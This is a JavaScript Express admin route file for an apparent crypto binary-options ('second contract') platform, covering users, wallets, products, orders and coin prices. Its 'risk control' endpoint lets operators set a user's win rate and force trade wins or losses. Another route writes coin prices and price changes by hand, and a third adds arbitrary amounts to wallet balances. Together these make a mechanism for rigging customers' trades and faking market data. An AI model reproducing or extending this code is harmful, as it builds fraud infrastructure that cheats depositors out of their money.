/**
 * backend/src/routes/admin.js
 * 后台管理全集（用户 / 钱包 / 订单 / 行情 / 秒合约 / 风控）
 */

const express = require("express");
const router = express.Router();
const pool = require("../db/pool");

// ===== 管理员鉴权 =====
function adminAuth(req, res, next) {
  const key = req.headers["x-admin-key"];
  if (!key || key !== process.env.ADMIN_API_KEY) {
    return res.status(401).json({ message: "Unauthorized" });
  }
  next();
}

/* =========================
   用户管理 + 风控
========================= */

// 用户列表（含风控字段）
router.get("/users", adminAuth, async (req, res) => {
  try {
    const { rows } = await pool.query(
      `SELECT id, username, email, status, win_rate, force_result, created_at
       FROM users
       ORDER BY id DESC`
    );
    res.json({ users: rows });
  } catch (err) {
    console.error(err);
    res.status(500).json({ message: "Server error" });
  }
});

// 修改用户状态（ACTIVE / BANNED）
router.post("/users/status", adminAuth, async (req, res) => {
  const { userId, status } = req.body;
  if (!userId || !status) {
    return res.status(400).json({ message: "Invalid params" });
  }

  try {
    await pool.query(
      `UPDATE users SET status=$1 WHERE id=$2`,
      [status, userId]
    );
    res.json({ success: true });
  } catch (err) {
    console.error(err);
    res.status(500).json({ message: "Server error" });
  }
});

// 设置用户风控（胜率 / 强制输赢）
router.post("/users/risk", adminAuth, async (req, res) => {
  const { userId, winRate, forceResult } = req.body;

  try {
    await pool.query(
      `UPDATE users
       SET win_rate=$1,
           force_result=$2
       WHERE id=$3`,
      [
        winRate !== undefined ? winRate : null,
        forceResult || null,
        userId
      ]
    );
    res.json({ success: true });
  } catch (err) {
    console.error(err);
    res.status(500).json({ message: "Server error" });
  }
});

/* =========================
   钱包管理
========================= */

router.get("/wallets", adminAuth, async (req, res) => {
  try {
    const { rows } = await pool.query(
      `SELECT w.user_id, u.username, w.currency, w.balance, w.frozen
       FROM wallets w
       JOIN users u ON u.id = w.user_id
       ORDER BY w.user_id ASC`
    );
    res.json({ wallets: rows });
  } catch (err) {
    console.error(err);
    res.status(500).json({ message: "Server error" });
  }
});

router.post("/wallet/adjust", adminAuth, async (req, res) => {
  const { userId, amount, currency = "USDT" } = req.body;
  if (!userId || !amount) {
    return res.status(400).json({ message: "Invalid params" });
  }

  try {
    await pool.query(
      `INSERT INTO wallets (user_id, currency, balance)
       VALUES ($1,$2,0)
       ON CONFLICT (user_id, currency) DO NOTHING`,
      [userId, currency]
    );

    await pool.query(
      `UPDATE wallets
       SET balance = balance + $1
       WHERE user_id=$2 AND currency=$3`,
      [amount, userId, currency]
    );

    res.json({ success: true });
  } catch (err) {
    console.error(err);
    res.status(500).json({ message: "Server error" });
  }
});

/* =========================
   秒合约产品管理（核心）
========================= */

router.get("/contract-products", adminAuth, async (req, res) => {
  const { rows } = await pool.query(
    `SELECT * FROM contract_products ORDER BY seconds ASC`
  );
  res.json({ products: rows });
});

router.post("/contract-products/save", adminAuth, async (req, res) => {
  const { id, seconds, payout_ratio, min_amount, max_amount, status } = req.body;

  if (!seconds || !payout_ratio) {
    return res.status(400).json({ message: "Invalid params" });
  }

  if (id) {
    await pool.query(
      `UPDATE contract_products
       SET seconds=$1,payout_ratio=$2,min_amount=$3,max_amount=$4,status=$5
       WHERE id=$6`,
      [seconds, payout_ratio, min_amount, max_amount, status, id]
    );
  } else {
    await pool.query(
      `INSERT INTO contract_products
       (seconds,payout_ratio,min_amount,max_amount,status)
       VALUES ($1,$2,$3,$4,$5)`,
      [seconds, payout_ratio, min_amount, max_amount, status || "ACTIVE"]
    );
  }

  res.json({ success: true });
});

/* =========================
   订单管理
========================= */

router.get("/orders", adminAuth, async (req, res) => {
  const { rows } = await pool.query(
    `SELECT o.*, u.username
     FROM contract_orders o
     JOIN users u ON u.id = o.user_id
     ORDER BY o.id DESC`
  );
  res.json({ orders: rows });
});

/* =========================
   行情管理
========================= */

router.get("/coins", adminAuth, async (req, res) => {
  const { rows } = await pool.query(
    `SELECT * FROM coins ORDER BY symbol ASC`
  );
  res.json({ coins: rows });
});

router.post("/coins/update", adminAuth, async (req, res) => {
  const { symbol, price, change } = req.body;
  if (!symbol || price == null) {
    return res.status(400).json({ message: "Invalid params" });
  }

  await pool.query(
    `UPDATE coins
     SET current_price=$1, price_change=$2
     WHERE symbol=$3`,
    [price, change || 0, symbol]
  );

  res.json({ success: true });
});

module.exports = router;
